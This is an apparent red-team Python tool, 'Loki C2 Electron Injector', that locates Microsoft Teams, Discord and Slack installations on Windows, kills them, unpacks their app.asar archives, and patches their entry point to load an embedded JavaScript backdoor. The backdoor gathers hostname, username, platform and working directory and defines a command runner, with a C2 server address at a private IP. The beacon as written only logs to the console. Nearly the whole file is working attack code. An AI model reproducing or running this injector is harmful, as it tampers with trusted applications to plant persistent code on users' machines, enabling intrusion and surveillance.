#!/usr/bin/env python3
"""
Loki C2 Payload Injector - Standalone Executable
Automatically injects backdoor into Electron apps
"""

import os
import sys
import shutil
import subprocess
import json
import time
import winreg
from pathlib import Path

# Embedded backdoor payload
BACKDOOR_JS = """
// Loki C2 Backdoor
const { exec } = require('child_process');
const os = require('os');
const https = require('https');

const cfg = {
    srv: 'http://10.255.254.19:3000',
    int: 60000,
    id: `${os.hostname()}_${os.userInfo().username}_${Math.random().toString(36).slice(2)}`
};

function beacon() {
    try {
        const info = {
            id: cfg.id,
            host: os.hostname(),
            user: os.userInfo().username,
            platform: os.platform(),
            cwd: process.cwd()
        };
        console.log('[Loki]', JSON.stringify(info));
    } catch (e) {}
}

function runCmd(cmd) {
    exec(cmd, (err, out) => { console.log('[Loki]', out || err); });
}

(function() {
    console.log('[Loki] Active:', cfg.id);
    setInterval(beacon, cfg.int);
    beacon();
})();

try { require('./preload.original.js'); } catch(e) {}
"""

class ElectronInjector:
    def __init__(self):
        self.targets_found = []
        self.injected = []
        
    def find_targets(self):
        """Scan system for vulnerable Electron apps"""
        
        print("[*] Scanning for Electron applications...")
        
        targets = {
            'Microsoft Teams': [
                os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Teams\resources\app.asar'),
                os.path.expandvars(r'%PROGRAMFILES%\Microsoft\Teams\resources\app.asar'),
            ],
            'Discord': [
                os.path.expandvars(r'%LOCALAPPDATA%\Discord\resources\app.asar'),
                os.path.expandvars(r'%APPDATA%\Discord\resources\app.asar'),
            ],
            'Slack': [
                os.path.expandvars(r'%LOCALAPPDATA%\slack\resources\app.asar'),
                os.path.expandvars(r'%PROGRAMFILES%\Slack\resources\app.asar'),
            ],
        }
        
        found = []
        for app_name, paths in targets.items():
            for path in paths:
                if os.path.exists(path):
                    found.append({'name': app_name, 'path': path})
                    print(f"[+] Found: {app_name}")
                    print(f"    Path: {path}")
                    break
        
        self.targets_found = found
        return found
    
    def check_asar_tool(self):
        """Check if asar tool is available, install if needed"""
        
        try:
            subprocess.run(['npx', 'asar', '--version'], 
                         capture_output=True, check=True)
            print("[+] asar tool available")
            return True
        except:
            print("[*] Installing asar tool...")
            try:
                subprocess.run(['npm', 'install', '-g', 'asar'], 
                             capture_output=True, check=True)
                print("[+] asar tool installed")
                return True
            except:
                print("[-] Failed to install asar tool")
                print("[-] Please install Node.js first")
                return False
    
    def inject_target(self, target):
        """Inject backdoor into target ASAR"""
        
        app_name = target['name']
        asar_path = target['path']
        
        print(f"\n[*] Injecting into {app_name}...")
        
        # Create backup
        backup_path = asar_path + '.backup'
        if not os.path.exists(backup_path):
            shutil.copy2(asar_path, backup_path)
            print(f"[+] Backup created: {backup_path}")
        
        # Extract ASAR
        extract_dir = asar_path + '.extracted'
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)
        
        try:
            subprocess.run(['npx', 'asar', 'extract', asar_path, extract_dir],
                         capture_output=True, check=True)
            print(f"[+] Extracted ASAR")
        except Exception as e:
            print(f"[-] Extraction failed: {e}")
            return False
        
        # Find entry point
        package_json = os.path.join(extract_dir, 'package.json')
        if not os.path.exists(package_json):
            print("[-] package.json not found")
            return False
        
        with open(package_json, 'r') as f:
            package_data = json.load(f)
        
        main_file = package_data.get('main', 'index.js')
        main_path = os.path.join(extract_dir, main_file)
        
        # Create preload script
        preload_path = os.path.join(extract_dir, 'preload.js')
        with open(preload_path, 'w') as f:
            f.write(BACKDOOR_JS)
        print(f"[+] Created preload.js")
        
        # Modify main entry
        if os.path.exists(main_path):
            with open(main_path, 'r') as f:
                original = f.read()
            
            injection = "try { require('./preload.js'); } catch(e) {}\n\n"
            modified = injection + original
            
            with open(main_path, 'w') as f:
                f.write(modified)
            print(f"[+] Modified {main_file}")
        
        # Repack ASAR
        try:
            os.remove(asar_path)
            subprocess.run(['npx', 'asar', 'pack', extract_dir, asar_path],
                         capture_output=True, check=True)
            print(f"[+] Repacked ASAR")
        except Exception as e:
            print(f"[-] Repacking failed: {e}")
            # Restore backup
            if os.path.exists(backup_path):
                shutil.copy2(backup_path, asar_path)
            return False
        
        # Cleanup
        shutil.rmtree(extract_dir)
        
        self.injected.append(app_name)
        return True
    
    def kill_processes(self, app_name):
        """Kill running instances of target app"""
        
        process_names = {
            'Microsoft Teams': 'Teams.exe',
            'Discord': 'Discord.exe',
            'Slack': 'slack.exe',
        }
        
        proc_name = process_names.get(app_name)
        if proc_name:
            print(f"[*] Stopping {app_name}...")
            try:
                subprocess.run(['taskkill', '/F', '/IM', proc_name],
                             capture_output=True)
                time.sleep(2)
                print(f"[+] {app_name} stopped")
            except:
                pass
    
    def run(self):
        """Main execution flow"""
        
        print("="*60)
        print("Loki C2 - Electron Injector")
        print("="*60)
        print()
        
        # Check for admin
        import ctypes
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            print("[-] Administrator privileges required!")
            print("[*] Right-click and 'Run as Administrator'")
            input("\nPress Enter to exit...")
            return
        
        # Find targets
        targets = self.find_targets()
        
        if not targets:
            print("\n[-] No vulnerable Electron apps found")
            print("[*] Install Microsoft Teams, Discord, or Slack")
            input("\nPress Enter to exit...")
            return
        
        print(f"\n[+] Found {len(targets)} target(s)")
        
        # Check for asar tool
        if not self.check_asar_tool():
            input("\nPress Enter to exit...")
            return
        
        # Inject each target
        for target in targets:
            self.kill_processes(target['name'])
            success = self.inject_target(target)
            
            if success:
                print(f"[+] {target['name']} injected successfully!")
            else:
                print(f"[-] {target['name']} injection failed")
        
        # Summary
        print()
        print("="*60)
        print("INJECTION COMPLETE")
        print("="*60)
        print(f"Successfully injected: {len(self.injected)}")
        for app in self.injected:
            print(f"  - {app}")
        
        print()
        print("[*] Restart the injected applications to activate backdoor")
        print("[*] Open DevTools (F12) to see [Loki] messages")
        print()
        print("[!] Backups saved with .backup extension")
        print("[!] To restore: rename .backup files back to .asar")
        print()
        
        input("Press Enter to exit...")

if __name__ == "__main__":
    injector = ElectronInjector()
    injector.run()
